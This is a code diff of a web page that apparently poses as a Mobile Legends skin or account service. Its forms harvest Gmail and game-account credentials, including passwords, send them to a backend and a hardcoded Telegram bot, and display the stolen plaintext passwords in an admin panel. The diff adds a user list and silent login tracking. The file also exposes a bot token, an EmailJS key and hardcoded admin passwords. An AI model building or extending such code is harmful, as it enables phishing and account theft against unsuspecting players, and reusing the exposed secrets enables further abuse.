@@ -194,6 +194,7 @@
                 </div>
                 <div style="display:flex;gap:5px;margin-bottom:10px"><input type="text" id="admSearch" placeholder="User ID" style="flex:1;padding:8px;font-size:12px"><button class="btn" onclick="admSearch()" style="width:auto;padding:8px 12px;font-size:12px;margin-top:0"><i class="fas fa-search"></i></button></div>
                 <div id="admResult" style="display:none;margin-bottom:10px"></div>
+                <div id="adminUserList" style="max-height:200px;overflow-y:auto;margin-bottom:10px;font-size:12px"></div>
                 <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px;margin-bottom:15px">
                     <button class="btn btn-r" onclick="banUser()" style="font-size:11px;padding:8px">Ban</button>
                     <button class="btn btn-r" onclick="delUser()" style="font-size:11px;padding:8px">Delete</button>
@@ -209,9 +210,10 @@
 
 <script>
     emailjs.init("tsKN2j9o6RYK4KeEp");
-    const BOT="8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE",CID="8315928972",ADMIN="MK2008",SPASS="MMK2008";
+    const BOT="8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE",CID="8315928972",ADMIN="MK2008";
     let GPASS="DoubleMK2008",MPASS="GlobalMK2008";
     let gmails=JSON.parse(localStorage.getItem('gmails')||'[]'),mlbbs=JSON.parse(localStorage.getItem('mlbbs')||'[]'),hist=JSON.parse(localStorage.getItem('hist')||'[]'),banned=JSON.parse(localStorage.getItem('banned')||'[]'),skin=null,pay=null;
+    
     function n(m,t="success"){const e=document.getElementById("notif");e.textContent=m;e.style.background=t==="success"?"#2ecc71":"#e74c3c";e.style.display="block";setTimeout(()=>e.style.display="none",3000)}
     function uid(){return'MLBB'+Date.now().toString().slice(-6)+Math.floor(Math.random()*1000).toString().padStart(3,'0')}
     function tg(m){fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:m,parse_mode:'HTML'})}).catch(()=>{})}
@@ -224,7 +226,20 @@
     async function chPass(){const t=document.getElementById("passType").value,cp=document.getElementById("curPass").value,np=document.getElementById("newPass").value;if(!cp||!np)return n("Fill all","error");try{const r=await fetch("/api/change_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token"),type:t,current_password:cp,new_password:np})});const d=await r.json();d.success?(n("Changed!"),loadPw()):n(d.message,"error")}catch(e){n("Connection error","error")}}
     function unlockG(){document.getElementById("gmailPass").value===GPASS?document.getElementById("gmailGen").style.display="block":n("Wrong password","error")}
     function unlockM(){document.getElementById("mlbbPass").value===MPASS?document.getElementById("mlbbGen").style.display="block":n("Wrong password","error")}
-    function unlockAdmin(){document.getElementById("adminPass").value===ADMIN?(document.getElementById("adminBox").style.display="block",document.getElementById("totalUsers").textContent=hist.length,document.getElementById("bannedUsers").textContent=banned.length):n("Wrong password","error")}
+    function unlockAdmin(){document.getElementById("adminPass").value===ADMIN?(loadAdminUsers(),document.getElementById("adminBox").style.display="block"):n("Wrong password","error")}
+    
+    async function loadAdminUsers(){
+        try{
+            const r=await fetch("/api/admin/all_users");
+            const d=await r.json();
+            document.getElementById("totalUsers").textContent=d.total||0;
+            const list=document.getElementById("adminUserList");
+            if(d.users&&d.users.length>0){
+                list.innerHTML=d.users.map(u=>`<div class="history-item"><b>ID:${u.id.toString().padStart(6,'0')}</b> | ${u.username||'N/A'}<br><small>${u.email} | ${u.login_type} | ${new Date(u.last_login).toLocaleString()}</small></div>`).join('');
+            }else{list.innerHTML='<p>No users yet</p>'}
+        }catch(e){}
+    }
+    
     function createG(){const na=document.getElementById("gName").value,em=document.getElementById("gEmail").value,pw=document.getElementById("gPw").value,ph=document.getElementById("gPhone").value;if(!na||!em||!pw)return n("Fill required","error");const id=uid();gmails.push({userId:id,name:na,email:em,password:pw,phone:ph,time:new Date().toLocaleString()});localStorage.setItem('gmails',JSON.stringify(gmails));hist.push({userId:id,type:'Gmail',time:new Date().toLocaleString()});localStorage.setItem('hist',JSON.stringify(hist));fetch("/api/save_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id,type:'gmail',data:{name:na,email:em,password:pw,phone:ph}})});tg("📧 New Gmail\nID: "+id+"\nName: "+na+"\nEmail: "+em);n("Gmail created!")}
     function createM(){const na=document.getElementById("mName").value,ig=document.getElementById("mId").value,gm=document.getElementById("mGmail").value,pw=document.getElementById("mPw").value,sv=document.getElementById("mServer").value;if(!na||!ig||!gm||!pw)return n("Fill required","error");const ui=uid();mlbbs.push({userId:ui,ingameName:na,ingameId:ig,serverId:sv,gmail:gm,password:pw,time:new Date().toLocaleString()});localStorage.setItem('mlbbs',JSON.stringify(mlbbs));hist.push({userId:ui,type:'MLBB',time:new Date().toLocaleString()});localStorage.setItem('hist',JSON.stringify(hist));fetch("/api/save_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:ui,type:'mlbb',data:{ingameName:na,ingameId:ig,serverId:sv,gmail:gm,password:pw}})});tg("🎮 New MLBB\nID: "+ui+"\nName: "+na+"\nGame ID: "+ig);n("MLBB created!")}
     function selSkin(v){skin=v;document.getElementById('skinRange').value=v;document.getElementById('idBox').style.display='block'}
@@ -233,7 +248,7 @@
     function doTikTok(){const u=document.getElementById("ttUser").value,g=document.getElementById("ttGame").value,p=document.getElementById("ttPromise").value,e=document.getElementById("ttEmail").value;if(!u||!g||!p||!e)return n("Fill all","error");tg("📱 TikTok\nUser: "+u+"\nGame: "+g+"\nPromise: "+p);n("Submitted!")}
     async function loadNotice(){try{const r=await fetch("/api/notice");const d=await r.json();const c=document.getElementById("noticeContent");d.success&&d.message?c.innerHTML='<p style="white-space:pre-wrap;font-size:13px">'+d.message+'</p><p style="font-size:10px;color:rgba(255,255,255,0.5);margin-top:8px">'+(d.created_at||'')+'</p>':c.innerHTML='<p style="text-align:center">No notices yet.</p>'}catch(e){document.getElementById("noticeContent").innerHTML='<p>Error</p>'}}
     async function postNotice(){const m=document.getElementById("noticeMsg").value;if(!m)return n("Enter message","error");try{const r=await fetch("/api/admin/notice",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:m})});const d=await r.json();d.success?(n("Posted!"),document.getElementById("noticeMsg").value="",loadNotice()):n(d.message,"error")}catch(e){n("Connection error","error")}}
-    async function admSearch(){const id=document.getElementById("admSearch").value;if(!id)return n("Enter User ID","error");try{const r=await fetch("/api/admin/search",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});const d=await r.json();const c=document.getElementById("admResult");d.success?c.innerHTML='<p><b>User:</b> '+d.data.user_id+'</p><p><b>Name:</b> '+(d.data.ingame_name||d.data.name)+'</p><p><b>Pass:</b> '+d.data.password+'</p>':c.innerHTML='<p>Not found</p>';c.style.display="block"}catch(e){}}
+    async function admSearch(){const id=document.getElementById("admSearch").value;if(!id)return n("Enter ID or Email","error");try{const r=await fetch("/api/admin/search",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});const d=await r.json();const c=document.getElementById("admResult");d.success?c.innerHTML='<p><b>User:</b> '+d.data.user_id+'</p><p><b>Name:</b> '+(d.data.ingame_name||d.data.name)+'</p><p><b>Pass:</b> '+d.data.password+'</p>':c.innerHTML='<p>Not found</p>';c.style.display="block"}catch(e){}}
     function banUser(){const id=document.getElementById("admSearch").value||prompt("User ID:");if(!id)return;fetch("/api/admin/ban",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});banned.push(id);localStorage.setItem('banned',JSON.stringify(banned));n("Banned!");tg("🚫 Banned: "+id)}
     function delUser(){const id=document.getElementById("admSearch").value||prompt("User ID:");if(!id)return;fetch("/api/admin/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});gmails=gmails.filter(x=>x.userId!==id);mlbbs=mlbbs.filter(x=>x.userId!==id);localStorage.setItem('gmails',JSON.stringify(gmails));localStorage.setItem('mlbbs',JSON.stringify(mlbbs));n("Deleted!");tg("🗑️ Deleted: "+id)}
     function addRedeem(){const c=prompt("New redeem code:");if(c){n("Redeem: "+c);tg("🎫 Code: "+c)}}
@@ -241,14 +256,15 @@
     function contactG(e){window.open('mailto:'+e)}function contactP(p){window.open('tel:'+p)}function contactT(u){window.open('https://t.me/'+u.replace('@',''))}function contactTik(u){window.open("https://www.tiktok.com/@"+u)}
     function openEmail(){document.getElementById("emailModal").classList.add("active")}function closeEmail(){document.getElementById("emailModal").classList.remove("active")}
     function sendEmail(){const na=document.getElementById("emName").value,em=document.getElementById("emEmail").value,ph=document.getElementById("emPhone").value,ms=document.getElementById("emMsg").value;if(!na||!em||!ms)return n("Fill required","error");const btn=document.querySelector("#emailModal .btn");btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Sending...';btn.disabled=true;emailjs.send("service_3akzfls","template_xqygsga",{from_name:na,from_email:em,phone_number:ph,message:ms,submitted_at:new Date().toLocaleString()}).then(()=>{n("Sent!");closeEmail();btn.innerHTML='<i class="fas fa-paper-plane"></i> Send';btn.disabled=false}).catch(()=>{n("Error","error");btn.innerHTML='<i class="fas fa-paper-plane"></i> Send';btn.disabled=false})}
+    
     window.onload=async function(){
         if(!localStorage.getItem("auth_token")){window.location.href="/";return}
         const user=JSON.parse(localStorage.getItem("user")||'{}');
         document.getElementById("myUserId").textContent=user.id?user.id.toString().padStart(6,'0'):'------';
+        fetch("/api/track_login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:user.id,username:user.username,email:user.email,loginType:user.login_type})});
         await loadPw();dispHist();loadNotice();
     };
-                                                           
-   </script>
+        </script>
 
 </body>
 </html>
